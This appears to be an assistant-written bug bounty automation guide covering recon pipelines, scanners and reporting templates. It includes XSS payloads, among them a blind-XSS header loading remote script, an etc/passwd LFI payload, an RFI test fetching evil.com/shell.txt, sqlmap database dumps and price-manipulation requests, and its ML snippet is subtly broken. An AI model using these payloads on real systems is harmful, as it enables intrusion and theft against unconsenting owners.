# Bug Bounty Workflows & Automation

## Table of Contents
1. [Complete Bug Bounty Methodologies](#complete-bug-bounty-methodologies)
2. [One-Liner Commands](#one-liner-commands)
3. [Automation Scripts & Pipelines](#automation-scripts--pipelines)
4. [Tool Chaining Techniques](#tool-chaining-techniques)
5. [Recon Automation Workflows](#recon-automation-workflows)
6. [Vulnerability Scanning Automation](#vulnerability-scanning-automation)
7. [Asset Discovery Pipelines](#asset-discovery-pipelines)
8. [Continuous Monitoring Setups](#continuous-monitoring-setups)
9. [Reporting & Documentation Workflows](#reporting--documentation-workflows)
10. [Platform-Specific Approaches](#platform-specific-approaches)

---

## Complete Bug Bounty Methodologies

### Phase 1: Reconnaissance & Information Gathering

#### 1.1 Subdomain Enumeration
```bash
# Basic subdomain discovery
subfinder -d target.com -silent | tee subdomains.txt
subfinder -d target.com -all -recursive > subdomains_recursive.txt

# Passive subdomain enumeration with multiple sources
amass enum -d target.com -o subdomains_amass.txt
assetfinder --subs-only target.com | tee subdomains_assetfinder.txt

# Combine all subdomain sources
cat subdomains*.txt | sort -u | tee all_subdomains.txt
```

#### 1.2 Asset Discovery & Validation
```bash
# Validate live subdomains
cat all_subdomains.txt | httpx -title -sc -tech -threads 200 | tee live_subdomains.txt

# Extract only 200 status code domains
grep -E "200" live_subdomains.txt > active_subdomains.txt

# Screenshot capture for visual verification
gowitness file -f active_subdomains.txt --threads 10
```

#### 1.3 Service & Port Discovery
```bash
# Quick port scan on live hosts
nmap -T4 -Pn -p- -iL active_subdomains.txt -oA nmap_all_ports

# Service version detection
nmap -T4 -Pn -sV -sC -iL active_subdomains.txt -oA nmap_service_scan

# Masscan for fast port scanning
masscan -p1-65535 -iL ip_addresses.txt --max-rate 1000 -oG masscan_results.txt
```

### Phase 2: URL Discovery & Content Analysis

#### 2.1 URL Enumeration
```bash
# Wayback Machine URLs
waybackurls target.com | tee wayback_urls.txt

# GAU (Get All URLs) - multiple sources
gau target.com --threads 5 | tee gau_urls.txt

# Katana for crawling and URL discovery
katana -u target.com -d 5 -jc -f qurl | tee katana_urls.txt

# Combine and deduplicate URLs
cat wayback_urls.txt gau_urls.txt katana_urls.txt | uro | sort -u > all_urls.txt
```

#### 2.2 Parameter Discovery
```bash
# Extract URLs with parameters
cat all_urls.txt | grep '=' | uro | tee parameterized_urls.txt

# Parameter bruteforce with spyhunt
python3 spyhunt.py -pm target.com --save params_bruteforce_results.txt

# JS file analysis for hidden endpoints
cat all_urls.txt | grep -E '\.js$' | nuclei -t nuclei-templates/http/exposures/
```

### Phase 3: Vulnerability Discovery

#### 3.1 XSS Testing
```bash
# Filter XSS-prone parameters
cat parameterized_urls.txt | gf xss | tee xss_candidates.txt

# Reflected XSS testing
cat xss_candidates.txt | dalfox pipe --skip-bav

# Blind XSS testing
cat xss_candidates.txt | bxss -appendMode -payload '<svg/onload=alert(1)>' -o blind_xss_results.txt
```

#### 3.2 SQL Injection Testing
```bash
# Filter SQLi-prone parameters
cat parameterized_urls.txt | gf sqli | tee sqli_candidates.txt

# Automated SQLi testing with Ghauri
ghauri -m sqli_candidates.txt --batch --dbs --level 3 --confirm
```

#### 3.3 Local File Inclusion (LFI)
```bash
# Filter LFI-prone parameters
cat parameterized_urls.txt | gf lfi | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | tee lfi_candidates.txt

# FFUF LFI testing
cat lfi_candidates.txt | while read url; do ffuf -u $url -w payloads/lfi.txt -c -mr 'root:' -v; done
```

---

## One-Liner Commands

### Recon & Enumeration One-Liners

#### Comprehensive Subdomain Discovery
```bash
# All-in-one subdomain enumeration
subfinder -d target.com -silent | httpx -silent | nuclei -tags exposure -o vulnerabilities.txt
```

#### Quick Asset Discovery
```bash
# Certificate transparency subdomain discovery
curl "https://certspotter.com/api/v0/certs?domain=target.com" | jq '.[].dns_names[]' | sed 's/"//g' | sed 's/\*\.//g' | sort -u
```

#### Live Host Identification
```bash
# Quick live host check with technology detection
echo "target.com" | subfinder -silent | httpx -title -tech -status-code
```

### XSS One-Liners

#### Reflected XSS Testing
```bash
# Basic XSS payload testing
echo "https://target.com/search?q=" | httpx -silent | xargs -I {} curl -s "{}<script>alert(1)</script>" | grep -i "script"
```

#### Blind XSS in Headers
```bash
# Header-based blind XSS
cat domains.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://xss.report/c/test></script>"
```

#### XSS Parameter Testing
```bash
# Parameter-based XSS testing
waybackurls target.com | gf xss | sed 's/=.*/=/' | sort -u | xargs -I {} curl -s "{}%3Cscript%3Ealert(1)%3C/script%3E"
```

### SQL Injection One-Liners

#### Basic SQLi Detection
```bash
# Quick SQLi error detection
echo "https://target.com/page?id=1'" | httpx -silent | grep -i "error\|mysql\|sql"
```

#### Parameter-based SQLi Testing
```bash
# Automated SQLi parameter testing
waybackurls target.com | gf sqli | sqlmap --batch --dbs --level 3
```

### LFI One-Liners

#### LFI Parameter Testing
```bash
# Quick LFI testing
waymore -i target.com -n -mode U | gf lfi | sed 's/=.*/=/' | qsreplace "../../../../etc/passwd" | httpx -mc 200
```

### CORS One-Liners

#### CORS Misconfiguration Testing
```bash
# CORS header testing
curl -H 'Origin: https://evil.com' -I https://target.com | grep -i access-control-allow
```

---

## Automation Scripts & Pipelines

### Comprehensive Recon Pipeline

#### Full Automated Recon Script
```bash
#!/bin/bash
TARGET=$1
OUTPUT_DIR="recon_$TARGET"

# Create output directory
mkdir -p $OUTPUT_DIR
cd $OUTPUT_DIR

# Phase 1: Subdomain Discovery
echo "[+] Starting subdomain enumeration..."
subfinder -d $TARGET -silent > subdomains_subfinder.txt
assetfinder --subs-only $TARGET > subdomains_assetfinder.txt
amass enum -d $TARGET -o subdomains_amass.txt

# Combine and deduplicate
cat subdomains*.txt | sort -u > all_subdomains.txt
echo "[+] Found $(wc -l < all_subdomains.txt) unique subdomains"

# Phase 2: Live Host Detection
echo "[+] Checking for live hosts..."
cat all_subdomains.txt | httpx -silent -title -tech -status-code > live_hosts.txt

# Phase 3: URL Discovery
echo "[+] Discovering URLs..."
cat live_hosts.txt | awk '{print $1}' | gau --threads 10 > gau_urls.txt
cat live_hosts.txt | awk '{print $1}' | waybackurls > wayback_urls.txt
cat gau_urls.txt wayback_urls.txt | uro | sort -u > all_urls.txt

# Phase 4: Parameter Extraction
echo "[+] Extracting parameters..."
cat all_urls.txt | grep '=' | uro > parameterized_urls.txt

# Phase 5: Vulnerability Scanning
echo "[+] Running vulnerability scans..."
cat parameterized_urls.txt | gf xss > xss_candidates.txt
cat parameterized_urls.txt | gf sqli > sqli_candidates.txt
cat parameterized_urls.txt | gf lfi > lfi_candidates.txt

# Phase 6: Nuclei Scanning
echo "[+] Running Nuclei templates..."
nuclei -l all_urls.txt -t nuclei-templates/ -o nuclei_results.txt

echo "[+] Recon complete! Results saved in $OUTPUT_DIR"
```

### VPS Automation Setup

#### Continuous Monitoring Script
```bash
#!/bin/bash
# VPS continuous monitoring setup

# Install required tools
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest

# Create monitoring function
monitor_target() {
    local target=$1
    local output_dir="monitoring_$(date +%Y%m%d_%H%M%S)"
    
    mkdir -p $output_dir
    cd $output_dir
    
    # Daily subdomain monitoring
    subfinder -d $target -silent | httpx -silent > today_subdomains.txt
    
    # Compare with previous day
    if [ -f ../previous_subdomains.txt ]; then
        diff today_subdomains.txt ../previous_subdomains.txt > new_subdomains.txt
        if [ -s new_subdomains.txt ]; then
            echo "New subdomains found for $target:"
            cat new_subdomains.txt
            # Send notification (Slack, Discord, email, etc.)
        fi
    fi
    
    cp today_subdomains.txt ../previous_subdomains.txt
    cd ..
}

# Set up cron job for daily monitoring
echo "0 2 * * * /path/to/monitor_script.sh target.com" | crontab -
```

---

## Tool Chaining Techniques

### Advanced Tool Combinations

#### Recon Chain with Screenshot
```bash
# Complete recon with visual verification
subfinder -d target.com -silent | httpx -silent -title -tech | tee live_hosts.txt | awk '{print $1}' | gowitness file -f -
```

#### XSS Discovery Chain
```bash
# Comprehensive XSS discovery pipeline
waybackurls target.com | gf xss | uro | Gxss | kxss | dalfox pipe --skip-bav
```

#### SQLi Discovery Chain
```bash
# SQL injection discovery pipeline
gau target.com | gf sqli | uro | sqlmap --batch --random-agent --level 3
```

#### Directory Discovery Chain
```bash
# Directory and file discovery
httpx -l subdomains.txt -path /admin,/login,/dashboard,/api -mc 200,403,301
```

### Multi-Tool Automation

#### Shodan + Hunter.py Integration
```bash
# Discover assets with Shodan, scan with Hunter
sqry -q "ssl.cert.subject.CN:target.com" --json --limit 100 | jq -r '.ip_str' > target_ips.txt
python3 hunter.py --cve+ports --target target_ips.txt --json-output comprehensive_scan.json
```

#### Certificate Transparency + Nuclei
```bash
# Certificate transparency discovery with vulnerability scanning
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httpx -silent | nuclei -tags cve
```

---

## Recon Automation Workflows

### Passive Reconnaissance Workflow

#### Information Gathering Pipeline
```bash
#!/bin/bash
TARGET=$1

# Certificate Transparency
curl -s "https://certspotter.com/api/v0/certs?domain=$TARGET" | jq -r '.[].dns_names[]' | sed 's/\*\.//g' | sort -u > ct_subdomains.txt

# DNS Records
dig $TARGET any +noall +answer > dns_records.txt
nslookup -type=mx $TARGET >> dns_records.txt

# Whois Information
whois $TARGET > whois_info.txt

# Shodan Information
shodan search hostname:$TARGET > shodan_results.txt

# Social Media & Code Search
python3 -c "
import requests
import json

# GitHub search
github_api = 'https://api.github.com/search/code'
params = {'q': '$TARGET', 'sort': 'indexed'}
response = requests.get(github_api, params=params)
with open('github_results.json', 'w') as f:
    json.dump(response.json(), f, indent=2)
"
```

### Active Reconnaissance Workflow

#### Service Discovery Pipeline
```bash
#!/bin/bash
TARGET=$1

# Port scanning
nmap -T4 -Pn -sS -sV -O $TARGET -oA nmap_scan

# HTTP service discovery
httpx -target $TARGET -ports 80,443,8080,8443,3000,5000,8000 -title -tech

# Directory brute forcing
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$TARGET/FUZZ -fc 404

# Technology stack detection
whatweb $TARGET -a 3 > whatweb_results.txt
```

---

## Vulnerability Scanning Automation

### Automated XSS Detection

#### Comprehensive XSS Pipeline
```bash
#!/bin/bash
TARGET=$1

# URL collection
gau $TARGET | tee urls.txt
waybackurls $TARGET >> urls.txt
katana -u $TARGET -d 5 -jc -f qurl >> urls.txt

# Parameter extraction
cat urls.txt | grep '=' | uro > parameterized_urls.txt

# XSS testing
cat parameterized_urls.txt | gf xss | dalfox pipe -b http://your-callback-domain/
cat parameterized_urls.txt | bxss -appendMode -payload '<svg onload=alert(1)>' -parameters
```

### SQL Injection Automation

#### Automated SQLi Detection
```bash
#!/bin/bash
TARGET=$1

# Parameter discovery
python3 paramspider.py -d $TARGET -o sqli_params.txt

# SQLi testing
sqlmap -m sqli_params.txt --batch --random-agent --level 3 --risk 2 --threads 10

# Manual verification
cat sqli_params.txt | while read url; do
    curl -s "${url}'" | grep -i "error\|mysql\|sql\|syntax" && echo "Potential SQLi: $url"
done
```

### LFI/RFI Automation

#### File Inclusion Testing Pipeline
```bash
#!/bin/bash
TARGET=$1

# LFI parameter discovery
gau $TARGET | gf lfi | sed 's/=.*/=/' | sort -u > lfi_params.txt

# LFI payload testing
cat lfi_params.txt | while read param; do
    ffuf -u "${param}FUZZ" -w /usr/share/wordlists/lfi-payloads.txt -mc 200 -mr "root:"
done

# RFI testing
cat lfi_params.txt | while read param; do
    curl -s "${param}http://evil.com/shell.txt" | grep -i "evil content"
done
```

---

## Asset Discovery Pipelines

### Complete Asset Discovery

#### Multi-Source Asset Discovery
```bash
#!/bin/bash
TARGET=$1

# Subdomain enumeration from multiple sources
subfinder -d $TARGET -all -recursive -o subfinder_results.txt
assetfinder --subs-only $TARGET > assetfinder_results.txt
amass enum -d $TARGET -brute -o amass_results.txt
findomain -t $TARGET -o findomain_results.txt

# Certificate transparency
curl -s "https://crt.sh/?q=%.$TARGET&output=json" | jq -r '.[].name_value' | sort -u > ct_results.txt

# Combine all sources
cat *_results.txt | sort -u > all_subdomains.txt

# Validate and enrich
cat all_subdomains.txt | httpx -silent -title -tech -status-code > live_assets.txt

# IP resolution
cat all_subdomains.txt | dnsx -resp -o resolved_ips.txt

# Port scanning on discovered IPs
cat resolved_ips.txt | naabu -top-ports 1000 -o open_ports.txt
```

### Cloud Asset Discovery

#### AWS/GCP/Azure Discovery
```bash
#!/bin/bash
TARGET=$1

# S3 bucket discovery
python3 cloud_enum.py -k $TARGET -l aws_buckets.txt

# Google Cloud Storage
gsutil ls gs://${TARGET}* > gcs_buckets.txt 2>/dev/null

# Azure blob storage
python3 -c "
import requests
subdomains = ['$TARGET', 'dev-$TARGET', 'prod-$TARGET', 'test-$TARGET']
for sub in subdomains:
    url = f'https://{sub}.blob.core.windows.net/'
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            print(f'Found: {url}')
    except:
        pass
"

# GitHub repository search
github-dorker -d $TARGET -o github_results.txt
```

---

## Continuous Monitoring Setups

### Automated Monitoring System

#### Daily Monitoring Script
```bash
#!/bin/bash
# /usr/local/bin/bug_bounty_monitor.sh

TARGETS_FILE="/home/user/targets.txt"
OUTPUT_BASE="/home/user/monitoring"
DATE=$(date +%Y%m%d)

while read -r target; do
    echo "[+] Monitoring $target"
    OUTPUT_DIR="$OUTPUT_BASE/${target}/$DATE"
    mkdir -p "$OUTPUT_DIR"
    
    # Subdomain monitoring
    subfinder -d "$target" -silent | httpx -silent > "$OUTPUT_DIR/current_subdomains.txt"
    
    # Compare with previous day
    PREV_FILE="$OUTPUT_BASE/${target}/$(date -d '1 day ago' +%Y%m%d)/current_subdomains.txt"
    if [ -f "$PREV_FILE" ]; then
        diff "$PREV_FILE" "$OUTPUT_DIR/current_subdomains.txt" > "$OUTPUT_DIR/subdomain_changes.txt"
        if [ -s "$OUTPUT_DIR/subdomain_changes.txt" ]; then
            echo "New assets found for $target!" | mail -s "Bug Bounty Alert" your-email@domain.com
        fi
    fi
    
    # Vulnerability scanning on new assets
    nuclei -l "$OUTPUT_DIR/current_subdomains.txt" -t nuclei-templates/cves/ -o "$OUTPUT_DIR/cve_scan.txt"
    
done < "$TARGETS_FILE"
```

#### Continuous Integration Setup
```yaml
# .github/workflows/bug_bounty_monitor.yml
name: Bug Bounty Monitoring

on:
  schedule:
    - cron: '0 0 * * *'  # Daily at midnight
  workflow_dispatch:

jobs:
  monitor:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Setup Go
        uses: actions/setup-go@v2
        with:
          go-version: 1.19
          
      - name: Install tools
        run: |
          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
          
      - name: Run monitoring
        run: |
          while read target; do
            subfinder -d $target -silent | httpx -silent | nuclei -t templates/ -o results_${target}.txt
          done < targets.txt
          
      - name: Upload results
        uses: actions/upload-artifact@v2
        with:
          name: monitoring-results
          path: results_*.txt
```

---

## Reporting & Documentation Workflows

### Vulnerability Documentation Template

#### Standard Vulnerability Report
```markdown
# Vulnerability Report

## Executive Summary
- **Vulnerability Type**: [XSS/SQLi/LFI/etc.]
- **Severity**: [Critical/High/Medium/Low]
- **Asset**: [URL or domain]
- **Impact**: [Brief description]

## Technical Details

### Description
[Detailed description of the vulnerability]

### Reproduction Steps
1. Step 1
2. Step 2
3. Step 3

### Proof of Concept
```bash
# Command or payload used
curl -X POST "https://target.com/vulnerable-endpoint" \
  -H "Content-Type: application/json" \
  -d '{"param": "<script>alert(1)</script>"}'
```

### Impact Assessment
- Data exposure risk
- Account compromise potential
- Business logic bypass
- Privilege escalation

### Remediation
- Immediate fixes
- Long-term improvements
- Security best practices

### References
- OWASP guidelines
- CVE references
- Security research papers
```

#### Automated Report Generation
```bash
#!/bin/bash
# generate_report.sh

TARGET=$1
SCAN_DATE=$(date +%Y-%m-%d)

cat << EOF > "report_${TARGET}_${SCAN_DATE}.md"
# Bug Bounty Report - $TARGET
**Date**: $SCAN_DATE
**Scope**: $TARGET

## Assets Discovered
$(cat live_subdomains.txt | wc -l) live subdomains found
$(cat all_urls.txt | wc -l) URLs discovered
$(cat open_ports.txt | wc -l) open ports identified

## Vulnerabilities Found
### High Priority
$(grep -c "critical\|high" nuclei_results.txt) high-priority issues

### Medium Priority  
$(grep -c "medium" nuclei_results.txt) medium-priority issues

### Low Priority
$(grep -c "low\|info" nuclei_results.txt) informational issues

## Detailed Findings
$(cat nuclei_results.txt)

## Recommendations
- Implement proper input validation
- Enable security headers
- Regular security testing
- Update vulnerable components
EOF
```

### Evidence Collection Automation

#### Screenshot & Evidence Collection
```bash
#!/bin/bash
# collect_evidence.sh

TARGET=$1
EVIDENCE_DIR="evidence_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

# Screenshots
gowitness file -f vulnerable_urls.txt -D "$EVIDENCE_DIR/screenshots"

# HTTP responses
cat vulnerable_urls.txt | while read url; do
    curl -s -D headers.txt "$url" > "$EVIDENCE_DIR/response_$(echo $url | sed 's|[^a-zA-Z0-9]|_|g').txt"
    cp headers.txt "$EVIDENCE_DIR/headers_$(echo $url | sed 's|[^a-zA-Z0-9]|_|g').txt"
done

# Network traffic capture
tshark -i any -f "host $TARGET" -w "$EVIDENCE_DIR/traffic_capture.pcap" &
sleep 60
killall tshark
```

---

## Platform-Specific Approaches

### HackerOne Optimization

#### HackerOne Program Discovery
```bash
# Find HackerOne programs
curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/hackerone_data.json" | jq -r '.[].targets.in_scope[] | select(.asset_type=="URL") | .asset_identifier' > hackerone_targets.txt

# Filter by bounty availability
curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/hackerone_data.json" | jq -r '.[] | select(.offers_bounties==true) | .targets.in_scope[] | select(.asset_type=="URL") | .asset_identifier' > bounty_targets.txt
```

#### HackerOne-Specific Testing
```bash
#!/bin/bash
# hackerone_approach.sh

# Focus on common HackerOne vulnerability types
TARGET=$1

# SSRF testing (common on HackerOne)
cat urls.txt | gf ssrf | while read url; do
    curl -s "$url" | grep -i "metadata\|169.254" && echo "Potential SSRF: $url"
done

# Open redirect testing
cat urls.txt | gf redirect | while read url; do
    curl -s -I "${url}evil.com" | grep -i "location.*evil.com" && echo "Open Redirect: $url"
done

# XXE testing
find . -name "*.xml" -o -name "*.svg" | while read file; do
    grep -i "DOCTYPE\|ENTITY" "$file" && echo "Potential XXE: $file"
done
```

### Bugcrowd Optimization

#### Bugcrowd Program Discovery
```bash
# Bugcrowd targets
curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/bugcrowd_data.json" | jq -r '.[].targets.in_scope[] | select(.type=="website") | .target' > bugcrowd_targets.txt
```

#### Bugcrowd-Focused Testing
```bash
#!/bin/bash
# bugcrowd_approach.sh

TARGET=$1

# Business logic testing (popular on Bugcrowd)
echo "[+] Testing for business logic flaws"

# Race condition testing
for i in {1..10}; do
    curl -s -X POST "https://$TARGET/api/purchase" -d "item_id=1&quantity=-1" &
done
wait

# Price manipulation
curl -s -X POST "https://$TARGET/checkout" -d "price=-100&item=premium_feature"

# Account takeover chains
python3 account_takeover_chain.py --target $TARGET
```

### Intigriti Optimization  

#### Intigriti Program Discovery
```bash
# Intigriti targets (EU focus)
curl -s "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/intigriti_data.json" | jq -r '.[].targets.in_scope[] | .endpoint' > intigriti_targets.txt
```

#### Intigriti-Specific Methodology
```bash
#!/bin/bash
# intigriti_approach.sh

TARGET=$1

# European compliance testing (GDPR focus)
echo "[+] Testing GDPR compliance issues"

# Data exposure testing
curl -s "https://$TARGET/api/users" | jq . | grep -i "email\|phone\|address"

# Cookie analysis
curl -s -I "https://$TARGET" | grep -i "set-cookie" | grep -v "secure\|httponly\|samesite"

# Privacy policy violations
python3 gdpr_scanner.py --target $TARGET
```

### Government Programs (DoD, etc.)

#### Government-Specific Approach
```bash
#!/bin/bash
# Warning: Only use on authorized government bug bounty programs

TARGET=$1

# Focus on configuration issues (common in gov systems)
echo "[+] Scanning for misconfigurations"

# Default credentials testing
python3 default_creds_checker.py --target $TARGET

# Information disclosure
curl -s "https://$TARGET/server-info" 
curl -s "https://$TARGET/server-status"
curl -s "https://$TARGET/.well-known/security.txt"

# Version disclosure
nmap -sV --script version --script-args version.showall $TARGET
```

---

## Advanced Automation Techniques

### Machine Learning Integration

#### Anomaly Detection for New Assets
```python
#!/usr/bin/env python3
# ml_asset_monitor.py

import requests
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import DBSCAN
import json

def detect_anomalies(current_assets, historical_assets):
    """Detect anomalous new assets using ML"""
    
    # Vectorize asset names
    vectorizer = TfidfVectorizer()
    all_assets = historical_assets + current_assets
    X = vectorizer.fit_transform(all_assets)
    
    # Clustering to find outliers
    clustering = DBSCAN(eps=0.3, min_samples=2)
    clusters = clustering.fit_predict(X)
    
    # Find assets in no cluster (anomalies)
    anomalies = [asset for i, asset in enumerate(current_assets) 
                if clusters[len(historical_assets):][i - len(historical_assets)] == -1]
    
    return anomalies

# Usage
historical = load_historical_assets()
current = discover_current_assets()
suspicious = detect_anomalies(current, historical)
```

### API Integration Framework

#### Multi-Platform Integration
```python
#!/usr/bin/env python3
# platform_integrator.py

import requests
import json
from datetime import datetime

class BountyPlatformIntegrator:
    def __init__(self):
        self.platforms = {
            'hackerone': self.get_hackerone_programs,
            'bugcrowd': self.get_bugcrowd_programs,
            'intigriti': self.get_intigriti_programs
        }
    
    def get_all_programs(self):
        all_programs = {}
        for platform, getter in self.platforms.items():
            try:
                programs = getter()
                all_programs[platform] = programs
            except Exception as e:
                print(f"Error fetching {platform}: {e}")
        
        return all_programs
    
    def get_hackerone_programs(self):
        # HackerOne API integration
        url = "https://api.hackerone.com/v1/programs"
        headers = {"Accept": "application/json"}
        response = requests.get(url, headers=headers)
        return response.json()
    
    def prioritize_targets(self, programs):
        """Prioritize targets based on various factors"""
        priorities = []
        
        for platform, program_list in programs.items():
            for program in program_list:
                score = self.calculate_priority_score(program)
                priorities.append({
                    'platform': platform,
                    'program': program,
                    'score': score
                })
        
        return sorted(priorities, key=lambda x: x['score'], reverse=True)
    
    def calculate_priority_score(self, program):
        """Calculate priority score based on multiple factors"""
        score = 0
        
        # Bounty amount
        if program.get('bounty_range_max'):
            score += min(program['bounty_range_max'] / 1000, 10)
        
        # Response time
        avg_response = program.get('avg_response_time', 30)
        score += max(0, 10 - avg_response / 7)
        
        # Scope size
        scope_count = len(program.get('scope', []))
        score += min(scope_count, 5)
        
        return score
```

---

## Performance Optimization

### High-Speed Scanning Techniques

#### Parallel Processing Pipeline
```bash
#!/bin/bash
# parallel_scanner.sh

TARGET_LIST=$1
THREADS=${2:-50}

# Split targets for parallel processing
split -l $(($(wc -l < $TARGET_LIST) / $THREADS + 1)) $TARGET_LIST target_chunk_

# Process each chunk in parallel
for chunk in target_chunk_*; do
    (
        while read target; do
            echo "[+] Scanning $target"
            subfinder -d "$target" -silent | httpx -silent -threads 100 > "results_$target.txt"
            nuclei -l "results_$target.txt" -t nuclei-templates/cves/ -c 50 >> "vulns_$target.txt"
        done < "$chunk"
    ) &
done

wait
echo "[+] All scans completed"

# Combine results
cat results_*.txt > all_results.txt
cat vulns_*.txt > all_vulnerabilities.txt
```

#### Memory-Efficient Large-Scale Scanning
```bash
#!/bin/bash
# memory_efficient_scanner.sh

# Stream processing to handle large datasets
stream_process() {
    local input_file=$1
    local batch_size=1000
    
    # Process in batches to manage memory
    split -l $batch_size "$input_file" batch_
    
    for batch in batch_*; do
        echo "[+] Processing batch: $batch"
        
        # Process batch
        cat "$batch" | httpx -silent -threads 50 | \
        nuclei -t nuclei-templates/ -c 30 -o "batch_results_$(basename $batch).txt"
        
        # Clean up intermediate files
        rm "$batch"
        
        # Brief pause to prevent overwhelming target
        sleep 2
    done
    
    # Combine all batch results
    cat batch_results_*.txt > final_results.txt
    rm batch_results_*.txt
}
```

This comprehensive bug bounty workflows document provides Doctor K with a complete automation framework for bug bounty hunting, covering everything from basic reconnaissance to advanced platform-specific approaches. The workflows are designed to be practical, scalable, and efficient for real-world bug bounty hunting scenarios.